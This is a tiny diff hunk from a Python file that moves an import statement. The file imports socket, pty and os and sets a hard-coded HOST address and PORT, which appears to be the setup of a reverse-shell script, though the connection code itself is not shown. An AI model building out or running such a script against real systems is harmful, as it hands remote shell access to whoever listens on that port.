@@ -1,6 +1,6 @@
+import socket
 import os
 import pty
-import socket
 
 HOST = '192.168.0.195'
 PORT = 6969
